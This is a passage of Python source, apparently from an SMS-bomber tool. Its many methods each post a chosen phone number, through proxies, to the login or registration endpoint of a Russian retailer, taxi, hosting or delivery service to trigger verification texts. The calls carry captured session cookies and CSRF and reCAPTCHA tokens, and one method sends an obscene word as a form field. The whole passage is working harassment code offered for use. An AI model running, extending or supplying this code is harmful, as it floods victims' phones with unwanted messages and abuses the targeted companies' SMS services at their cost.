            'Referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.Memory.Service%2520reviews%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520messagesender.sms%2520Sravni.Affiliates.Service%2520esia%2520orders.r%26response_type%3Dcode%2520id_token%2520token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fcallback%252F%26response_mode%3Dform_post%26state%3DRmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0%26nonce%3DzrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs%26login_hint%26acr_values&isinnerframe=true',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          '__RequestVerificationToken': 'CfDJ8Mo79Uhrc61BkNG7HBanVqfddj1HvO3ZSASCL80JzDrO0POC-Mgp1O-nte3Fk2FzD_MSBw6-P9d4Q8229e4gXa7YRY1nYzTh7U82Qs3QLA-dttR2kfxtMxoWZYlvX34LeXH8U9JDHgyxQcOkGoCs2Nk',
          'phone': f'+{self.phone_not_pluse}',
          'returnUrl': '/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.Memory.Service%20reviews%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20messagesender.sms%20Sravni.Affiliates.Service%20esia%20orders.r&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=RmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0&amp;nonce=zrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs&amp;login_hint&amp;acr_values'}

        response = requests.post('https://my.sravni.ru/signin/code', headers=headers, cookies=cookies, data=data, proxies=proxies)


    def citymobil(self,proxies):
        headers = {
            'authority': 'hemingoway.city-mobil.ru',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json',
            'origin': 'https://city-mobil.ru',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://city-mobil.ru/referral',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',}

        data = '{"phone":"sad","landing":"referral"}'.replace('sad',self.phone_not_pluse)

        response = requests.post('https://hemingoway.city-mobil.ru/api/v1/send_link', headers=headers, data=data, proxies=proxies)

    def maxi(self,proxies):
        headers = {
        'Connection': 'keep-alive',
        'PlatformName': 'WEB',
        'ApplicationVersion': '20.23.0',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Accept': 'application/json',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
        'Origin': 'https://maxi-retail.ru',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://maxi-retail.ru/auth',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        data = '{"phone":"uryn"}'.replace('uryn', self.phone_not_pluse[1:])

        response = requests.post('https://maxi.today/api/v3/registration/phone', headers=headers, data=data, proxies=proxies)

    def angels(self, proxies):
        headers = {
        'authority': 'www.netangels.ru',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://www.netangels.ru',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.netangels.ru/register/',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': 'netangels_metric_id=3143de9275f6f2cdd209e22e1598a2d5; netangels_metric_id.sig=ISyofXQzt57HM6dsHRGWiWPJ2ug; _ym_uid=16152128511023518687; _ym_d=1615212851; _ym_visorc=w; _ym_isad=1; _ga=GA1.2.2049361020.1615212852; _gid=GA1.2.1804511392.1615212852; _gat_UA-24070610-1=1; netangels:sess=9487a670-8404-4f12-b6f4-28ecf3c3f340; netangels:sess.sig=SHn2ecocOYMDoikxAyXQgtdt1AQ',
        }

        data = '{"type":"customer","name":"\u0418\u0432\u0430\u043D\u043E\u0432 \u0418\u0432\u0430\u043D \u0418\u0432\u0430\u043D\u043E\u0432\u0438\u0447","inn":"","phone":"+URRRR","email":"sjdfhsjdfhjajh@mail.ru","isAgree":true,"promoCode":"","partnerCode":""}'

        response = requests.post('https://www.netangels.ru/next-api/v1/register/sms/', headers=headers, data=data.replace('URRRR', self.phone_not_pluse).encode('utf-8'), proxies=proxies)

    def pronkers(self, proxies):
        amm = phone_mask(self.phone_not_pluse, '+# ### ###-##-##')
        headers = {
            'authority': 'pronkers.ru',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'x-custom-header': 'foobar',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://pronkers.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://pronkers.ru/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': '_ym_uid=1615213269278546905; _ym_d=1615213269; _ym_isad=1',
        }

        data = '{"phone":"uryn"}'.replace('uryn', amm)

        response = requests.post('https://pronkers.ru/api/client/auth/code', headers=headers, data=data, proxies=proxies)

    def ftrade(self, proxies):
        gen_slov = ['хуй','нога', 'соси','наебал', 'еблан', 'мама']
        headers = {
            'authority': 'f-trade.online',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://f-trade.online',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://f-trade.online/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': '__cfduid=d34f8f4dfd158535dcd0d14ade575572d1615214269; _ym_uid=1615214253140527971; _ym_d=1615214253; _ym_isad=1',
        }

        data = {
          'field0': self.phone_not_pluse,
          'field1': random.choice(gen_slov)
        }

        response = requests.post('https://f-trade.online/php/send.php', headers=headers, data=data, proxies=proxies)

    def sushiwok(self, proxies):
        amm = phone_mask(self.phone_not_pluse, '+#(###)###-##-##')
        
        headers = {
            'authority': 'sushiwok.ru',
            'accept': 'application/json, text/plain, */*',
            'x-csrf-token': 'tz70vMoL-0VQInx5uaTRC14legs_CX8DC9os',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://sushiwok.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://sushiwok.ru/spb/profile/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': '_csrf=lH4Ryi1VBKZsZ2r7UkeCEfrK; connect.sid=s%3AGr79X3B4iQFod3Sein1U-GlPnQvTllce.LisIeAqUdn0NtG8UMpxKWyFxWOcXMka9wD%2BMzYLBSb0; _gid=GA1.2.2060884779.1615215100; _ym_uid=1615215101536389399; _ym_d=1615215101; lgvid=604639f846e0fb0001e64fc3; lgkey=3fceed4268e01da86922939315def11c; _ym_visorc=w; _ym_isad=1; _fbp=fb.1.1615215103948.1720604809; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ga=GA1.1.895858968.1615215100; _ga_TE53H5X77H=GS1.1.1615215102.1.1.1615215127.0',
        }

        data = '{"phone":"aaaa","numbers":4}'.replace('aaaa', amm)

        response = requests.post('https://sushiwok.ru/user/phone/validate', headers=headers, data=data, proxies=proxies)



    def kolesadarom(self, proxies):
            
        cookies = {
            'PHPSESSID': 'WYtqFuOJdw3VdAUcLmm6c3kmsy2x5cNF',
            'BITRIX_SM_SRAS': 'Y',
            'adspire_uid': 'AS.464602555.1615234161',
            '_userGUID': '0:km10prny:P05rFVo7vXRDvC2xXEtfYWY5kedUXIuA',
            'dSesn': '9afcc318-a057-d812-9c6a-7af2efe57b74',
            '_dvs': '0:km10prny:JSwdL4QsuocTUTZMtF6_ckFnrJYNMbdh',
            '_gid': 'GA1.2.1578597261.1615234162',
            '_gat_UA-10390189-8': '1',
            '_gcl_au': '1.1.1237550680.1615234162',
            '_ym_uid': '1615234163828633511',
            '_ym_d': '1615234163',
            '_ga_N5DJYMMHYL': 'GS1.1.1615234162.1.0.1615234162.60',
            '_ga': 'GA1.1.601387749.1615234162',
            '_fbp': 'fb.1.1615234163075.297117107',
            '_ym_isad': '1',
            'kdACPT': '3',
            'kdCNACPD': 'true',
            'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
            'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
            'kdLHPT': '32',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'X-Bitrix-Csrf-Token': '2c9125d5d7daf47f0d396f6b258c4252',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/json;charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'BX-Ajax': 'true',
            'Origin': 'https://www.kolesa-darom.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.kolesa-darom.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phoneNumber":"aaaaa","approveRule":true,"step":{"requestCode":"requestCode"}}'

        response = requests.post('https://www.kolesa-darom.ru/ajax/user/register', headers=headers, cookies=cookies, data=data.replace('aaaaa', phone_not_pluse), proxies=proxies) 

    def truck(self, proxies):
        headers = {
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Accept': '*/*',
        'ZUMO-API-VERSION': '2.0.0',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'Origin': 'https://gettruck.ru',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://gettruck.ru/',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        params = (
            ('phone', self.phone_not_pluse[1:]),
            ('isCustomer', 'true'),
        )

        response = requests.post('https://gettruckapp.azurewebsites.net/api/User/RequestConfirmationCodePhone', headers=headers, params=params, proxies=proxies)


    def broniboy(self,proxies):
        amm = phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')
    
        cookies = {
            'PHPSESSID': '5hohg71g0cbkmonq7s325si327',
            'user_refresh_token': '6da081a6e4874ef262f0440727bb3f1e2a5dfd4fef45bc9c5f24bd2c10920edca%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22user_refresh_token%22%3Bi%3A1%3Bs%3A36%3A%22f6935de0-87d0-11eb-b6b6-eb8fe3c90d9b%22%3B%7D',
            'selected_domain': 'de30a27b921ab12960da602db09a42aaa09c0dfeda56d4ba4b7ed740294217c9a%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22selected_domain%22%3Bi%3A1%3Bs%3A6%3A%22moscow%22%3B%7D',
            '_csrf': 'c2fc8e4548aae1bfb4f746d7f8a553c72d1e519345d0d9275bd43ab8c311f09aa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22zVJ9VbhKsyfBXuPZ51PV5-OS18pr3Avi%22%3B%7D',
            '_ga': 'GA1.2.1428943935.1616061700',
            '_gid': 'GA1.2.1542062782.1616061700',
            '_ym_uid': '16160617001022414348',
            '_ym_d': '1616061700',
            '_ym_isad': '1',
            '_ym_visorc': 'w',
            '_fbp': 'fb.1.1616061700692.993187158',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'X-CSRF-Token': '6YQQtz3qq_9_S1QX2-4Zs9KZ9u5QMQUQg2Wdi-ech-CT0lqOa4jDtAwyMlWDm0np56imuGUcSkOyXe351N3xiQ==',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://broniboy.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://broniboy.ru/moscow/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          'phone': amm,
          '_csrf': '6YQQtz3qq_9_S1QX2-4Zs9KZ9u5QMQUQg2Wdi-ech-CT0lqOa4jDtAwyMlWDm0np56imuGUcSkOyXe351N3xiQ=='
        }

        response = requests.post('https://broniboy.ru/ajax/send-sms', headers=headers, cookies=cookies, data=data, proxies=proxies)


    def sokolov(self,proxies):
        cookies = {
        'guid_city': 'e718a680-4b33-11e4-ab6d-005056801329',
        'name_city': '%D0%9A%D0%B8%D0%B5%D0%B2',
        'guid_region': 'e718a680-4b33-11e4-ab6d-005056801329',
        'guid_country': '7f6f8f46-ce4c-4837-99fb-3b9738e884b2',
        'PHPSESSID': '4vvq0faej9oi0dab50pjo3jl7h',
        'fuser_id': '4d059bdfb215160cd9be92d904825950f1001db0a2c592155d0271bb5284517aa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%22e53abc50c9e40b6c4cc7df23af585682%22%3B%7D',
        '_csrf': '90324ba59d00884e83aac4c8fbbe3042dc519490d718e5f8dd7b45c60f679b90a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22WWd_tQaHdBYhNvJazSEjhelH_zlH4veZ%22%3B%7D',
        'dSesn': '2e24c0b1-33c0-9cde-8e72-da1185a3bccc',
        '_userGUID': '0:kmeppanq:Jz1_sW0ljeTuK6CHbLXD4AK0auqYBy2e',
        '_gid': 'GA1.2.1959839117.1616062191',
        '_ym_uid': '1616062191579299432',
        '_ym_d': '1616062191',
        '_dvs': '0:kmeppanq:e9mPBX2livTM~5JoT9~BVD9KXwZCyeYd',
        '_ym_visorc': 'w',
        'mindboxDeviceUUID': 'fc9b81f4-1e69-4e96-bd85-bb32c0aea013',
        'directCrm-session': '%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
        '_fbp': 'fb.1.1616062193298.1824922698',
        '_ym_isad': '1',
        'flocktory-uuid': '809c8a43-d5d2-46ef-899b-68fa5c166feb-2',
        '_ga': 'GA1.2.623425270.1616062191',
        '_gat_UA-50519746-1': '1',
        '_ga_4W8KQSGYRV': 'GS1.1.1616062189.1.0.1616062196.0',
        'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1',}

        headers = {
            'Connection': 'keep-alive',
            'X-Source': 'site',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://sokolov.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://sokolov.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phone":"ammw","_csrf":"amtgKZ4Re8yEwopd7c7qxG_k1FYFgXU0qn1lV12kZAU9PAR26kAahOCA0zWjuKClFbeRPG3kGXz1BwkfadIBXw=="}'.replace('ammw', self.phone_not_pluse)

        response = requests.post('https://sokolov.ru/auth/send-sms-code/', headers=headers, cookies=cookies, data=data, proxies=proxies)

    def savetime(self,proxies):
        headers = {
        'Connection': 'keep-alive',
        'X-HASH': 'c625e41dcf708c70aec75d9219846249',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVn8pvqIINnHzFQS4',
        'Origin': 'https://savetime.net',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://savetime.net/?sidebar_open=login',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '$------WebKitFormBoundaryVn8pvqIINnHzFQS4\\r\\nContent-Disposition: form-data; name="accept"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundaryVn8pvqIINnHzFQS4--\\r\\n'

        response = requests.post(f'https://api.savetime.net/v2/client/login/{self.phone_not_pluse}', headers=headers, data=data, proxies=proxies)


    def goldapple(self,proxies):
        headers = {
        'authority': 'goldapple.ru',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
        'recaptcha-token': '03AGdBq25UgAOHV6fXg1sh4WmVeNJqis6UQaznJSl56yy6fW-_dJnT7v_KQgLUEyaWyVaSIL-u4A0xoceLdjo2HAHqfV8EQH16Q_vhOEaMSsEvXzxng2G-epj9WzxBxc8QRoA9z1jfOJDg2vR57i5p4VKLTe3MeYpntjVQOhMTZLqlDQRdz6p6EAQmSF8OqeCrKXpqvCLJTZ43UNTvx2OWVmAmsWe2G5ahm8HrkDi0MLxJkwDVB6kCecWFYNFatY3yVZ8hyH9iuQAAy6y6ArohHOMitxoJ1cUSTu4U7UelXkbnN_EC9C2ODY8A-vH2hAw-sErL7BhQknwHLbZSXZT4DmOJma03UQFpmdWH3absLOp_b7ZCg-4_8CPNigBfnSxp2w3JvxjOoJzvjeIynp5xe4zXhHEu-pvlnw',
        'content-type': 'application/json',
        'origin': 'https://goldapple.ru',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://goldapple.ru/',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cookie': 'ipp_uid2=UKfgIumQqkJBYD73/+e69CptWHhDflGT/5Sv+oQ==; ipp_uid1=1616063138743; ipp_uid=1616063138743/UKfgIumQqkJBYD73/+e69CptWHhDflGT/5Sv+oQ==; rerf=AAAAAGBTKqI271HTA2QPAg==; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; flocktory-uuid=269e7a70-c08e-484d-8ae5-ac4c2960c443-0; form_key=GEF9MzPH6i1RCYUz; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; client-store-code=default; mage-cache-sessid=true; PHPSESSID=fnsp54igtu0iu99trmr4fsrj9o; store=default; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _userGUID=0:kmeq9dwv:aO7kVWva~kLxvbl05F5ev9OcMS_D626a; dSesn=da4b7085-8ecd-4f06-f40a-f8a242c63515; _dvs=0:kmeq9dwv:0IXdQtogVTVWhP86rd7UKEE4fuBbkEKa; section_data_ids=%7B%22geolocation%22%3A1616063147%2C%22cart%22%3A1616063147%2C%22adult_goods%22%3A1616063148%7D; _gid=GA1.2.135442248.1616063132; _gat_UA-31209334-1=1; _ym_uid=1616063132662367567; _ym_d=1616063132; _ga_QE5MQ8XJJK=GS1.1.1616063130.1.0.1616063130.0; _ga=GA1.2.1309556652.1616063132; _ym_isad=1; _fbp=fb.1.1616063133105.117113483; rr_rcs=eF4FwTESgCAMBMCGyr_cTC4hAX7gNwxSWNip73e3lHfu3mdreQxkzoV6DEWldGj6Ii26-tzu77lOYRsGBkPC6EYV0AD-n0UReQ; mindboxDeviceUUID=fc9b81f4-1e69-4e96-bd85-bb32c0aea013; directCrm-session=%7B%22deviceGuid%22%3A%22fc9b81f4-1e69-4e96-bd85-bb32c0aea013%22%7D',
          }

        data = '{"country_code":"RU","phone":"uryn"}'.replace('uryn', self.phone_not_pluse)

        response = requests.post('https://goldapple.ru/rest/V1/customer/registration/start', headers=headers, data=data, proxies=proxies)

    def uvelirocha(self,proxies):
        cookies = {
        'PHPSESSID': '493ugo6qqe2l1g2tbcfsghe51f',
        'rrpvid': '335673791170063',
        '_fbp': 'fb.1.1616064300795.1352726828',
        '_gcl_au': '1.1.797623151.1616064301',
        'rcuid': '5fe8a97d08718b000115e393',
        '_ga': 'GA1.2.570690183.1616064302',
        '_gid': 'GA1.2.384544699.1616064302',
        '_gat_UA-88245946-1': '1',
        '_ym_uid': '1616064302913184718',
        '_ym_d': '1616064302',
        '_ym_visorc': 'w',
        '_ym_isad': '1',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://xn--80adjmkewp8d3c.xn--p1ai',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://xn--80adjmkewp8d3c.xn--p1ai/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          'action': 'send_phone_code',
          'phone': self.phone_not_pluse
        }

        response = requests.post('https://xn--80adjmkewp8d3c.xn--p1ai/auth/', headers=headers, cookies=cookies, data=data, proxies=proxies)


    def kristall(self,proxies):
        amm = phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')

        headers = {
            'authority': 'www.kristall-shop.ru',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.kristall-shop.ru',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.kristall-shop.ru/personal/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'PHPSESSID=r4desh3fbhevg7m4vk2vf03na6; user_source=organic; user_id=46370e0a1b68d0bf4e1b7bb8132586c5; user_type=client; city=1; _ga=GA1.2.410195338.1616064609; _gid=GA1.2.1787331861.1616064609; _ym_uid=16160646121072446126; _ym_d=1616064612; _ym_visorc=w; _ym_isad=1; carrotquest_device_guid=36cb803c-bbe4-4b48-8521-d4d2861e48d4; carrotquest_uid=872051452346894408; carrotquest_auth_token=user.872051452346894408.30502-9dd4b1269cd5bcf498c034aaca.051ea86add4ca6f72946960e47db2ee520c6bb22c093bb47; carrotquest_realtime_services_transport=wss; _gat=1; _fbp=fb.1.1616064614999.196552439; _lhtm_u=605326f86b5eb17702d59945; _lhtm_r=https%3A//www.google.com/|240b43d374aac45ad0dae432; special_widget=on; pw_deviceid=00bf4aa8-09ef-4ce3-9330-fc09e2daa874; pw_status_ebb5e037c961ce0ebf4188bb99f304e89a224c184d76d400c4ec605fe7a4f999=deny; carrotquest_session=qinszpxcgcwpzuvtnztre0z75pdqekzq; carrotquest_session_started=1; lh_widget_system_pages_counter=1',
        }

        params = (
            ('x', 'personal'),
        )

        data = {
          'action': 'sms_send',
          'phone': amm
        }

        response = requests.post('https://www.kristall-shop.ru/ajaxer.php', headers=headers, params=params, data=data, proxies=proxies)


    def goldrussia(self,proxies):
        amm = phone_mask(self.phone_not_pluse, '+#(###)###-##-##')

        headers = {
            'authority': 'xn--g1acakobaarlah.xn--p1ai',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://xn--g1acakobaarlah.xn--p1ai',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://xn--g1acakobaarlah.xn--p1ai/personal/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'PHPSESSID=7g691o6vkbss75iu2vjebrc3e4; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A30%2C%22EXPIRE%22%3A1616273940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=161623262416945527; _ym_d=1616232624; _ga=GA1.2.2069047101.1616232624; _gid=GA1.2.897789363.1616232624; _gat_gtag_UA_154715236_1=1; _ym_isad=1; BX_USER_ID=471dd1e786051fd65f144165b507a5e2; _fbp=fb.1.1616232624485.377484962; supportOnlineTalkID=mydEBnrG9w9cqFccPSmzXXgo1rW8D2s5',
        }

        data = {
          'parameters': 'YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.02cf1ff2f016362b3db622809596116ce826b9002110b491f4befcea6b6a67ed',
          'template': '.default.f0631bee7eef513d3d0d3b25712602de7e1518245a18b04982bda2d781471d3c',
          'siteId': 's1',
          'sessid': '5649eb4bf466b995f313aa5092bb68f4',
          'method': 'sendCode',
          'phone': amm,
          'registration': 'N'
        }


        response = requests.post('https://xn--g1acakobaarlah.xn--p1ai/bitrix/components/bxmaker/authuserphone.login/ajax.php', headers=headers, data=data, proxies=proxies)


    def sephora(self,proxies):
        cookies = {
        't2s-analytics': 'bd90c42a-a0cc-4b0e-8d9a-9f60500e9e74',
        't2s-p': 'bd90c42a-a0cc-4b0e-8d9a-9f60500e9e74',
        't2s-rank': 'rank1',
        '_gcl_au': '1.1.1218343772.1616323817',
        '_ga': 'GA1.2.1102380899.1616323822',
        '_gid': 'GA1.2.2089747673.1616323822',
        '_ym_uid': '1616323823681180063',
        '_ym_d': '1616323823',
        'dSesn': '50a64a2b-598c-2622-2070-84f5a9fce271',
        '_userGUID': '0:kmj1gzwb:yTemoFOD9eKnmG3CbCs8XIgA3mqy6pes',
        '_dvs': '0:kmj1gzwb:I4MAeqPZbjDvd0YIW2BH2DCLYSpWbOnh',
        '_ym_visorc': 'w',
        '_gat_UA-87625978-40': '1',
        '_ym_isad': '1',
        'flocktory-uuid': '7b46a046-09ab-4fee-841d-245b8975056f-5',
        '_fbp': 'fb.1.1616323826912.234045356',
        }

        headers = {
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://sephora.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
